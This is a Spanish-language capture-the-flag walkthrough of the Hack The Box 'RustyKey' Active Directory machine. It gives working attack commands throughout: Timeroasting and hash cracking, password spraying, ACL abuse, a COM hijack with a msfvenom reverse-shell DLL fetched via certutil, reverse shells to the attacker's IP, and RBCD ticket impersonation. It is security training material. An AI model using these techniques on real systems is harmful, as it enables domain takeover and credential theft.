---
tags:
title: RustyKey - Hard (HTB)
permalink: /RustyKey-HTB-Writeup
toc: true
toc_label: Topics
toc_sticky: true
sidebar: main
---
---
# Recon

```bash
nmap -sCV -p53,88,135,139,389,445,464,593,636,3268,3269,5985,9389,47001,49664,49665,49666,49667,49671,49674,49675,49676,49677,49680,49693 10.129.232.127
Starting Nmap 7.98 ( https://nmap.org ) at 2025-12-30 17:26 -0300
Nmap scan report for 10.129.232.127
Host is up (0.71s latency).

PORT      STATE SERVICE       VERSION
53/tcp    open  domain        Simple DNS Plus
88/tcp    open  kerberos-sec  Microsoft Windows Kerberos (server time: 2025-12-31 04:29:16Z)
135/tcp   open  msrpc         Microsoft Windows RPC
139/tcp   open  netbios-ssn   Microsoft Windows netbios-ssn
389/tcp   open  ldap          Microsoft Windows Active Directory LDAP (Domain: rustykey.htb, Site: Default-First-Site-Name)
445/tcp   open  microsoft-ds?
464/tcp   open  kpasswd5?
593/tcp   open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
636/tcp   open  tcpwrapped
3268/tcp  open  ldap          Microsoft Windows Active Directory LDAP (Domain: rustykey.htb, Site: Default-First-Site-Name)
3269/tcp  open  tcpwrapped
5985/tcp  open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-server-header: Microsoft-HTTPAPI/2.0
|_http-title: Not Found
9389/tcp  open  mc-nmf        .NET Message Framing
47001/tcp open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-server-header: Microsoft-HTTPAPI/2.0
|_http-title: Not Found
49664/tcp open  msrpc         Microsoft Windows RPC
49665/tcp open  msrpc         Microsoft Windows RPC
49666/tcp open  msrpc         Microsoft Windows RPC
49667/tcp open  msrpc         Microsoft Windows RPC
49671/tcp open  msrpc         Microsoft Windows RPC
49674/tcp open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
49675/tcp open  msrpc         Microsoft Windows RPC
49676/tcp open  msrpc         Microsoft Windows RPC
49677/tcp open  msrpc         Microsoft Windows RPC
49680/tcp open  msrpc         Microsoft Windows RPC
49693/tcp open  msrpc         Microsoft Windows RPC
Service Info: Host: DC; OS: Windows; CPE: cpe:/o:microsoft:windows

Host script results:
| smb2-security-mode: 
|   3.1.1: 
|_    Message signing enabled and required
|_clock-skew: 8h02m18s
| smb2-time: 
|   date: 2025-12-31T04:30:32
|_  start_date: N/A

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 129.70 seconds
```

`As is common in real life Windows pentests, you will start the RustyKey box with credentials for the following account: rr.parker / 8#t5HE8L!W3A`

## RPC

Primero solicito un ticket para el usuario del cual dispongo de credenciales, debido a que la autenticacion `NTLM` esta deshabilitada.

> Cabe aclarar que para sincronizar mi reloj con la hora del `DC` use este comando ---> `ntpdate -b <ip>`.
> 
```bash
 impacket-getTGT rustykey.htb/rr.parker:'8#t5HE8L!W3A' -dc-ip 10.129.232.127
Impacket v0.13.0 - Copyright Fortra, LLC and its affiliated companies 

[*] Saving ticket in rr.parker.ccache
```
### Valid users

Una vez hecho esto, use el mismo ticket en indique el DC para poder conectarme a RPC para enumerar usuarios.

```bash
rpcclient -U 'rr.parker' dc.rustykey.htb --use-kerberos=required --realm rustykey.htb
Password for [WORKGROUP\rr.parker]:
rpcclient $> enumdomusers
user:[Administrator] rid:[0x1f4]
user:[Guest] rid:[0x1f5]
user:[krbtgt] rid:[0x1f6]
user:[rr.parker] rid:[0x471]
user:[mm.turner] rid:[0x472]
user:[bb.morgan] rid:[0x473]
user:[gg.anderson] rid:[0x474]
user:[dd.ali] rid:[0x477]
user:[ee.reed] rid:[0x479]
user:[nn.marcos] rid:[0x47a]
user:[backupadmin] rid:[0xe11]
```
## Shell as bb.morgan

Los metí dentro de un archivo para usarlos mas tarde, además recolecte la información con `bloodhound-python` usando estas credenciales.

```bash
bloodhound-python -ns 10.129.232.127 -u rr.parker -p '8#t5HE8L!W3A' -d rustykey.htb -c all -k
INFO: BloodHound.py for BloodHound LEGACY (BloodHound 4.2 and 4.3)
INFO: Found AD domain: rustykey.htb
INFO: Using TGT from cache
INFO: Found TGT with correct principal in ccache file.
INFO: Connecting to LDAP server: dc.rustykey.htb
INFO: Testing resolved hostname connectivity dead:beef::6a2c:5feb:4e69:83b2
INFO: Trying LDAP connection to dead:beef::6a2c:5feb:4e69:83b2
INFO: Found 1 domains
INFO: Found 1 domains in the forest
INFO: Found 16 computers
INFO: Connecting to LDAP server: dc.rustykey.htb
INFO: Testing resolved hostname connectivity dead:beef::6a2c:5feb:4e69:83b2
INFO: Trying LDAP connection to dead:beef::6a2c:5feb:4e69:83b2
INFO: Found 12 users
INFO: Found 58 groups
INFO: Found 2 gpos
INFO: Found 10 ous
INFO: Found 19 containers
INFO: Found 0 trusts
INFO: Starting computer enumeration with 10 workers
INFO: Querying computer: 
INFO: Querying computer: 
INFO: Querying computer: 
INFO: Querying computer: 
INFO: Querying computer: 
INFO: Querying computer: 
INFO: Querying computer: 
INFO: Querying computer: 
INFO: Querying computer: 
INFO: Querying computer: 
INFO: Querying computer: 
INFO: Querying computer: 
INFO: Querying computer: 
INFO: Querying computer: 
INFO: Querying computer: 
INFO: Querying computer: dc.rustykey.htb
WARNING: DCE/RPC connection failed: [Errno Connection error (10.129.232.127:445)] timed out
WARNING: DCE/RPC connection failed: The NETBIOS connection with the remote host timed out.
WARNING: DCE/RPC connection failed: [Errno Connection error (10.129.232.127:445)] timed out
INFO: Done in 02M 00S
```
### Timeroasting

Debido a que mi usuario no cuenta con privilegios sobre otros usuarios y al intentar ataques como `Kerberoasting` o `AS-REP Roast attack`, me dan errores de sincronización pase al `Timeroasting Attack`.

> Básicamente este ataque consiste en que cliente no autenticados puedan tomar una lista de `RIDs` y enviar solicitudes `MS-SNTP` al DC y asi poder capturar una huella MD5 que se calculan con los hashes de las computadoras del dominio `(Domain Computers)`.

Para poder extraer estos hashes encontré un script en python en este [repositorio](https://github.com/SecuraBV/Timeroast).

La cual al ejecutarla puedo ver los `RIDs` de los usuarios juntos con sus hashes.

```bash
 python3 timeroast.py dc.rustykey.htb
1000:$sntp-ms$dd47b0e799c8fb3e1f70e928671faf7f$1c0111e900000000000a04854c4f434cecff2440a4033e78e1b8428bffbfcd0aecff2a362bf2d21aecff2a362bf2e2e1
1103:$sntp-ms$9ae73bc0d21d18d6423551fa36f43ab5$1c0111e900000000000a04854c4f434cecff2440a73ae685e1b8428bffbfcd0aecff2a36cf2a7a27ecff2a36cf2a8c9b
1105:$sntp-ms$7e1f97129f1ec7450fa7d4a7f479b426$1c0111e900000000000a04854c4f434cecff2440a75c90fae1b8428bffbfcd0aecff2a36cf4c1c38ecff2a36cf4c38bd
1104:$sntp-ms$05fd9117c13f3a0af1afe2555d4010db$1c0111e900000000000a04854c4f434cecff2440a754bc19e1b8428bffbfcd0aecff2a36cf444905ecff2a36cf4463dd
1106:$sntp-ms$2e28adfd639dc7b81a533b6a48c6cd17$1c0111e900000000000a04854c4f434cecff2440a76c3258e1b8428bffbfcd0aecff2a36cf5bbbe8ecff2a36cf5bda1b
1107:$sntp-ms$41bca57da06ca9343124c664c79a060e$1c0111e900000000000a04854c4f434cecff2440a51e844fe1b8428bffbfcd0aecff2a36dced3522ecff2a36dced6fda
1118:$sntp-ms$73a3451e49fbaeda5942346f3a9350c1$1c0111e900000000000a04854c4f434cecff2440a5b5c2c5e1b8428bffbfcd0aecff2a36e98cc144ecff2a36e98cd713
1121:$sntp-ms$9e767593d03f5a63004e44b71a5047f7$1c0111e900000000000a04854c4f434cecff2440a5cd8630e1b8428bffbfcd0aecff2a36e9a47fa6ecff2a36e9a498d1
1119:$sntp-ms$6f4361c142b6806714c7ccfb6351e8df$1c0111e900000000000a04854c4f434cecff2440a5b6d798e1b8428bffbfcd0aecff2a36e98dd10eecff2a36e98debe6
1120:$sntp-ms$c635482b6fbb2c57e0d248611509d92d$1c0111e900000000000a04854c4f434cecff2440a5c9399ae1b8428bffbfcd0aecff2a36e9a034beecff2a36e9a04c3b
1122:$sntp-ms$98bf6dd0c38948fb2c9fe53e76ad5eac$1c0111e900000000000a04854c4f434cecff2440a5f7fc25e1b8428bffbfcd0aecff2a36e9ced769ecff2a36e9cf1073
1123:$sntp-ms$a3eeae09b9dcf8a179fc62c4a9148329$1c0111e900000000000a04854c4f434cecff2440a39b34a4e1b8428bffbfcd0aecff2a36eb8ac33decff2a36eb8adc67
1124:$sntp-ms$c905bbfb0b08f9faa14d86d57654989e$1c0111e900000000000a04854c4f434cecff2440a3ba55d1e1b8428bffbfcd0aecff2a36f7b2016fecff2a36f7b23571
1125:$sntp-ms$10e472b689d3ac10253e9481f260b45f$1c0111e900000000000a04854c4f434cecff2440a3bb07a8e1b8428bffbfcd0aecff2a36f7b2bf04ecff2a36f7b2e23f
1126:$sntp-ms$5dcff26037f1f878de4137b55bcb3941$1c0111e900000000000a04854c4f434cecff2440a3ded35fe1b8428bffbfcd0aecff2a36f7d6890eecff2a36f7d6adf7
	1127:$sntp-ms$b0de5ad69857caa6b75933e5b0fd0bd9$1c0111e900000000000a04854c4f434cecff2440a3e05392e1b8428bffbfcd0aecff2a36f7d80e49ecff2a36f7d82fd7
```
### Spraying

Para poder romper el mismo `hashcat` cuenta con el modo `31300` que corresponde a hashes `MS SNTP`.
Y es asi como obtuve una password.

```bash
hashcat -a 0 -m 31300 hashes.txt /usr/local/share/wordlists/rockyou.txt
...
<SNIP>
...
$sntp-ms$59c75a68fe6f9c5503f77e0b6c39c32e$1c0111e900000000000a73644c4f434ceca8e0a77afb168ce1b8428bffbfcd0aeca978c8432c1d95eca978c8432c4e3c:Rusty88!
```

Anteriormente me hice también la lista de computadoras que recolecte con `nxc`, e hice un password spraying de la contraseña que recolecte.

```bash
nxc smb dc.rustykey.htb -u computers -p 'Rusty88!' -k
SMB         dc.rustykey.htb 445    dc               [*]  x64 (name:dc) (domain:rustykey.htb) (signing:True) (SMBv1:False) (NTLM:False)
SMB         dc.rustykey.htb 445    dc               [-] rustykey.htb\DC$:Rusty88! KDC_ERR_PREAUTH_FAILED 
<SNIP> 
SMB         dc.rustykey.htb 445    dc               [+] rustykey.htb\IT-Computer3$:Rusty88! 
```
### DACL Enumeration

Viendo los datos en `bloodhound` veo que esta computadora tiene la posibilidad de agregarse al grupo `Help Desk`.

![image-center](/assets/images/Pasted image 20251231033455.png)

Para eso primero solicite el TGT.

```bash
impacket-getTGT 'rustykey.htb/IT-Computer3$:Rusty88!' -dc-ip 10.129.232.127
Impacket v0.13.0 - Copyright Fortra, LLC and its affiliated companies 

[*] Saving ticket in IT-Computer3$.ccache
```
### Add group member

Para esta tarea use `BloodyAD`.

```bash
bloodyAD -d rustykey.htb -u 'IT-Computer3$' -p 'Rusty88!' --host dc.rustykey.htb --dc-ip 10.129.232.127 -k add groupMember helpdesk 'IT-Computer3$'
[+] IT-Computer3$ added to helpdesk                     
```
### Change password

A su vez este grupo tiene el privilegio de cambio de password sobre 4 usuarios y un grupo.

![image-center](/assets/images/Pasted image 20260102173056.png)

Use el siguiente comando para cambiarle la password a todos los usuarios.

```bash
bloodyAD -d rustykey.htb --host dc.rustykey.htb -u 'IT-COMPUTER3$' -p 'Rusty88!' -k set password bb.morgan 'Password123!'
[+] Password changed successfully!
```
### Auth fail

Solicite el ticket para `bb.morgan` el cual tiene la capacidad de conectarse al servicio de `WinRM`, pero me da el siguiente error.

```bash
impacket-getTGT 'rustykey.htb/bb.morgan:Password123!' -dc-ip dc.rustykey.htb
Impacket v0.13.0 - Copyright Fortra, LLC and its affiliated companies 

Kerberos SessionError: KDC_ERR_ETYPE_NOSUPP(KDC has no support for encryption type)
```
### Remove group

Esto se debe a que estos usuarios forman parte del grupo `IT` y `Support`, donde a su vez ambos dos, son parte del grupo `Protected Objects`, por lo cual no puedo conectarme a WinRM debido a estar en este grupo.
Pero como tengo el privilegio `AddMember` sobre el grupo `Protected Objects`, puedo ejecutar el siguiente comando para remover a `IT` y `Support` de este grupo, ya que este permiso además de darte la capacidad de `añadir` miembros, tambien te otorga el permisos de `removerlos`.

```bash
bloodyAD -d rustykey.htb --host dc.rustykey.htb -u 'IT-COMPUTER3$' -p 'Rusty88!' -k remove groupMember 'Protected Objects' 'IT'                
[-] IT removed from Protected Objects

<SNIP>

bloodyAD -d rustykey.htb --host dc.rustykey.htb -u 'IT-COMPUTER3$' -p 'Rusty88!' -k remove groupMember 'Protected Objects' 'Support'                
[-] Support removed from Protected Objects
```

Ahora si con el ticket solicitado, puedo conectarme.

```powershell
 evil-winrm -i dc.rustykey.htb -r rustykey.htb                                     
                                        
Evil-WinRM shell v3.9

*Evil-WinRM* PS C:\Users\bb.morgan\Documents> type ../desktop/user.txt
c39a6cbdccb044fe3af45c4677c96958
```
## Shell as ee.reed

Veo que el directorio `Documents` de este usuario hay un `pdf`, asi que me lo baje a mi equipo.

```powershell
*Evil-WinRM* PS C:\Users\bb.morgan\Documents> cd ../desktop; gci -force


    Directory: C:\Users\bb.morgan\desktop


Mode                LastWriteTime         Length Name
----                -------------         ------ ----
-a----         6/4/2025   9:15 AM           1976 internal.pdf
-ar---       12/31/2025   3:26 AM             34 user.txt


*Evil-WinRM* PS C:\Users\bb.morgan\desktop> download internal.pdf
<SNIP>   
Info: Download successful!
```

Viendo el contenido del mismo, se ve que se habla de problemas relacionadas a la extracción/compresión, por lo que puedo pensar ya en herramientas como `WinRAR`, o `7-Zip`, y que ajustes en los niveles de registros están siendo inspeccionados.

```bash
Internal Memo
From: bb.morgan@rustykey.htb
To: support-team@rustykey.htb
Subject: Support Group - Archiving Tool Access
Date: Mon, 10 Mar 2025 14:35:18 +0100
Hey team,
As part of the new Support utilities rollout, extended access has been temporarily granted to allow
testing and troubleshooting of file archiving features across shared workstations.
This is mainly to help streamline ticket resolution related to extraction/compression issues reported
by the Finance and IT teams. Some newer systems handle context menu actions differently, so
registry-level adjustments are expected during this phase.
A few notes:
- Please avoid making unrelated changes to system components while this access is active.
- This permission change is logged and will be rolled back once the archiving utility is confirmed
stable in all environments.
- Let DevOps know if you encounter access errors or missing shell actions.
Thanks,
BB Morgan
IT Department
```
### COM Hijacking

Viendo en la carpeta de programas, veo que esta `7-Zip`.

```powershell
*Evil-WinRM* PS C:\Program Files> dir


    Directory: C:\Program Files


Mode                LastWriteTime         Length Name
----                -------------         ------ ----
d-----       12/26/2024   8:24 PM                7-Zip
d-----       12/26/2024   4:28 PM                Common Files
<SNIP>
```

Y volviendo al contenido del `pdf` donde habla de los niveles de registro ya puedo pensar en un `COM Hijacking`.

> Contexto: cuando haces clic derecho sobre un archivo para usar una herramienta (como una de archivado), el sistema no busca un simple archivo `.exe`. Lo que hace es consultar el Registro para encontrar un `objeto COM` (una extensión de la Shell) que le diga qué opciones mostrar.
### View permissions

El punto débil es que Windows busca `HKEY_CURRENT_USER\Software\Classes\CLSID` donde mi usuario tiene permisos y después en `HKEY_LOCAL_MACHINE\Software\Classes\CLSID` que solo los administradores tienen permisos.

Para ver los permisos puedo usar el siguiente comando:

```powershell
*Evil-WinRM* PS C:\Program Files\7-Zip> Get-Acl -Path "HKCU:\Software\Classes" | Select-Object -ExpandProperty Access


RegistryRights    : ReadKey
AccessControlType : Allow
IdentityReference : NT AUTHORITY\RESTRICTED
IsInherited       : False
InheritanceFlags  : ContainerInherit, ObjectInherit
PropagationFlags  : None

RegistryRights    : FullControl
AccessControlType : Allow
IdentityReference : NT AUTHORITY\SYSTEM
IsInherited       : False
InheritanceFlags  : ContainerInherit, ObjectInherit
PropagationFlags  : None

RegistryRights    : FullControl
AccessControlType : Allow
IdentityReference : BUILTIN\Administrators
IsInherited       : False
InheritanceFlags  : ContainerInherit, ObjectInherit
PropagationFlags  : None

RegistryRights    : FullControl
AccessControlType : Allow
IdentityReference : RUSTYKEY\bb.morgan
IsInherited       : False
InheritanceFlags  : ContainerInherit, ObjectInherit
PropagationFlags  : None

RegistryRights    : ReadKey
AccessControlType : Allow
IdentityReference : APPLICATION PACKAGE AUTHORITY\ALL APPLICATION PACKAGES
IsInherited       : False
InheritanceFlags  : ContainerInherit, ObjectInherit
PropagationFlags  : None

RegistryRights    : ReadKey
AccessControlType : Allow
IdentityReference : S-1-15-3-1024-1065365936-1281604716-3511738428-1654721687-432734479-3232135806-4053264122-3456934681
IsInherited       : False
InheritanceFlags  : ContainerInherit, ObjectInherit
PropagationFlags  : None

```

Es en este registro donde Windows se puede ver el `CLSID` con el cual la extensión `(Shell Extension)` se identifica con `7-Zip`, además es donde se ve el valor de `InprocServer32` con la `dll` que usa este binario `(7-Zip)`.

```powershell
*Evil-WinRM* PS C:\Users\bb.morgan\Documents> Get-ChildItem -Path HKLM:\SOFTWARE\Classes\CLSID -Recurse -ErrorAction SilentlyContinue | Where-Object { (Get-ItemProperty $_.PSPath)."(default)" -like "*7-Zip*" }


    Hive: HKEY_LOCAL_MACHINE\SOFTWARE\Classes\CLSID


Name                           Property
----                           --------
{23170F69-40C1-278A-1000-00010 (default) : 7-Zip Shell Extension
0020000}


    Hive: HKEY_LOCAL_MACHINE\SOFTWARE\Classes\CLSID\{23170F69-40C1-278A-1000-000100020000}


Name                           Property
----                           --------
InprocServer32                 (default)      : C:\Program Files\7-Zip\7-zip.dll
                               ThreadingModel : Apartment
```
### Craft payload

Como tengo la capacidad de editar este valor, puedo crear una `dll`, maliciosa con `msfvenom`, para luego poder cargarla en dicho valor.

```bash
 msfvenom -p windows/x64/shell_reverse_tcp LHOST=10.10.17.19 LPORT=4444 -f dll -o rusty_exploit.dll
[-] No platform was selected, choosing Msf::Module::Platform::Windows from the payload
[-] No arch selected, selecting arch: x64 from the payload
No encoder specified, outputting raw payload
Payload size: 460 bytes
Final size of dll file: 9216 bytes
Saved as: exploit.dll
```

Lo transfiero a la maquina.

```powershell
certutil -urlcache -split -f http://10.10.17.19/exploit.dll C:\programdata\exploit.dll
****  Online  ****
  0000  ...
  2400
CertUtil: -URLCache command completed successfully.
```

Sin embargo, me da errores, y es debido a que los permisos a pesar de tener permiso `Full Control` no es suficiente, por lo que con este comando vi los permisos, y donde veo al grupo `Support`, grupo del cual `ee.reed` es miembro.
## Shell as mm.turner 

Además a pesar de ser miembro del grupo `Remote Management Users` no tengo la capacidad de conectarme, por lo que subí el RunasCs.exe a la maquina y con las credenciales me envié una consola en `powershell` a mi maquina.

```powershell
*Evil-WinRM* PS C:\programdata> .\RunasCs.exe ee.reed Password123! powershell.exe -r 10.10.17.19:4444
[-] RunasCsException: LogonUser failed with error code: Account restrictions are preventing this user from signing in. For example: blank passwords aren't allowed, sign-in times are limited, or a policy restriction has been enforced
*Evil-WinRM* PS C:\programdata> .\RunasCs.exe ee.reed Password123! powershell.exe -r 10.10.17.19:4444
[*] Warning: User profile directory for user ee.reed does not exists. Use --force-profile if you want to force the creation.
[*] Warning: The logon for user 'ee.reed' is limited. Use the flag combination --bypass-uac and --logon-type '8' to obtain a more privileged token.

[+] Running in session 0 with process function CreateProcessWithLogonW()
[+] Using Station\Desktop: Service-0x0-11c22d3$\Default
[+] Async process 'C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe' with pid 5680 created in background.
```

Y desde mi listener recibo la conexion.

```powershell
rlwrap nc -nlvp 4444     
Connection from 10.10.11.75:59168
Windows PowerShell 
Copyright (C) Microsoft Corporation. All rights reserved.

PS C:\Windows\system32> 
```
### Set value

Ahora si puedo cambiar el valor a mi `dll`.

```powershell
PS C:\programdata> Set-ItemProperty "Registry::HKCR\CLSID\{23170F69-40C1-278A-1000-000100020000}\InProcServer32" -Name "(default)" -Value "C:\ProgramData\exploit.dll"
```
### Shell

Y luego de unos segundos recibo la conexión como el usuario `mm.turner`.

```powershell
rlwrap -cAr nc -nlvp 4444
listening on [any] 4444 ...
connect to [10.10.17.19] from (UNKNOWN) [10.129.232.127] 56896
Microsoft Windows [Version 10.0.17763.7434]
(c) 2018 Microsoft Corporation. All rights reserved.

C:\Windows>whoami
whoami
rustykey\mm.turner
```
## Shell as backupadmin

Este usuario es miembro del grupo `DelegationManager` el cual tiene la capacidad de performar un ataque `RBCD` sobre el dominio.

![image-center](/assets/images/Pasted image 20260102180507.png)

Por lo que como vi que no tengo la capacidad de agregar computadoras al domino, al ver el valor del `ms-DS-MachineAccountQuota` seteado a `0`, por lo que el camino mas corto, es usa una computadora existente como `IT-Computer3$` de la cual tengo la password.
### Add Account to act

Así que le doy permisos a usuario, para que pueda solicitar tickets el cual me permitan impersonar a otro usuario cualquiera.

```powershell
PS C:\Windows> Set-ADComputer DC -PrincipalsAllowedToDelegateToAccount IT-Computer3$
Set-ADComputer DC -PrincipalsAllowedToDelegateToAccount IT-Computer3$
```

Una vez hecho esto, con `getST` solicito un TGT del `DC` impersonando al usuario `backupadmin`, ya que el usuario `administrator` no admite delegación por `Kerberos`.

```bash
impacket-getST -spn 'cifs/dc.rustykey.htb' -k  -impersonate 'backupadmin' 'rustykey.htb/IT-Computer3$:Rusty88!'  
Impacket v0.13.0 - Copyright Fortra, LLC and its affiliated companies 

[*] Impersonating backupadmin
[*] Requesting S4U2self
[*] Requesting S4U2Proxy
[*] Saving ticket in backupadmin@cifs_dc.rustykey.htb@RUSTYKEY.HTB.ccache
```
### Shell

Y ya con este `ticket` puedo loguearme en la maquina y visualizar la flag.

```bash
impacket-wmiexec -k -no-pass rustykey.htb/backupadmin@dc.rustykey.htb 
Impacket v0.13.0 - Copyright Fortra, LLC and its affiliated companies 

[*] SMBv3.0 dialect used
[!] Launching semi-interactive shell - Careful what you execute
[!] Press help for extra shell commands
C:\>whoami
rustykey\backupadmin
```

```powershell
C:\Users\administrator\desktop>type root.txt
1d68dec721a9fb2d1333346960db7647
```

`~Happy Hacking.`